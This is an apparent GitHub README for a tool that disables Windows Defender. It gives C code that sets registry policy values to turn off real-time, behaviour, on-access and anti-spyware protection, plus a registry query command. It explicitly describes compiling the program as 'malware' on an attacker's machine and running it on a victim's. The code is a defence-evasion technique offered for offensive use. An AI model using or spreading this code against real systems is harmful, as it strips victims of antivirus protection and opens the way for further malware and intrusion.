# Disable-Windows-defender
Disable Windows Defender Antivirus via modifying Windows registry


To disable all this you just need to modify the registry keys:

LONG res = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows Defender", 0, KEY_ALL_ACCESS, &key);

if (res == ERROR_SUCCESS) {

  RegSetValueEx(key, "DisableAntiSpyware", 0, REG_DWORD, (const BYTE*)&disable, sizeof(disable));
  
  RegCreateKeyEx(key, "Real-Time Protection", 0, 0, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, 0, &new_key, 0);
  
  RegSetValueEx(new_key, "DisableRealtimeMonitoring", 0, REG_DWORD, (const BYTE*)&disable, sizeof(disable));
  
  RegSetValueEx(new_key, "DisableBehaviorMonitoring", 0, REG_DWORD, (const BYTE*)&disable, sizeof(disable));
  
  RegSetValueEx(new_key, "DisableScanOnRealtimeEnable", 0, REG_DWORD, (const BYTE*)&disable, sizeof(disable));
  
  RegSetValueEx(new_key, "DisableOnAccessProtection", 0, REG_DWORD, (const BYTE*)&disable, sizeof(disable));
  
  RegSetValueEx(new_key, "DisableIOAVProtection", 0, REG_DWORD, (const BYTE*)&disable, sizeof(disable));

  RegCloseKey(key);
  
  RegCloseKey(new_key);
}


Since Windows Vista, UAC has been a crucial feature for mitigating some risks associated with privilege elevation. Under UAC, local Administrators group accounts have two access tokens, one with standard user privileges and the other with administrator privileges. All processes (including the Windows explorer - explorer.exe) are launched using the standard token, which restricts the process’s rights and privileges. If the user desires elevated privileges, he may select “run as Administrator” to execute the process. This opt-in grants the process all administrative privileges and rights. A script or executable is typically run under the standard user token due to UAC access token filtering, unless it is “run as Administrator” in elevated privilege mode. As a developer or hacker, it is essential to understand the mode in which you are operating.

So we must create a function which is responsible to check the current privilege on the process:

bool isUserAdmin()

the IsUserAnAdmin function from the Windows API. This function returns a nonzero value if the current process is running with administrative 
privileges, and a zero value if the current process is not running with administrative privileges.
This code uses the CheckTokenMembership function to check if the current process is a member of the built-in administrators group. If the 
function returns a nonzero value, it means that the current process is running with administrative privileges. If the function returns a zero 
value, it means that the current process is not running with administrative privileges.



Befor Run the C source compiled file, first we wanna go to check the check registry keys:

reg query "HKLM\Software\Policies\Microsoft\Windows Defender" /s

![image](https://user-images.githubusercontent.com/68971838/209835454-b706af21-bf72-439d-b62f-d44c48caddce.png)

As see the following they are set to 0, which mean is enabled 


Then, let’s go to compile our script from attacker’s machine: And run it on the victim’s machine:

gcc disableWINDEF.c -o malware


run
![image](https://user-images.githubusercontent.com/68971838/209838925-3bee003a-d0cf-4881-a199-8770e115d674.png)

Again check:

![image](https://user-images.githubusercontent.com/68971838/209839187-948c60db-b831-42a0-8919-96c9752a069d.png)

The values now is 0x1 which mean is disabled :

![image](https://user-images.githubusercontent.com/68971838/209839384-103758e1-12c8-4d79-a8b0-6c2f2d76437d.png)


But of course, this trick is not new, nowadays threat actors may tamper with artifacts deployed and utilized by security tools. Security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Adversaries may unhook or otherwise modify these features added by tools to avoid detection.



:)
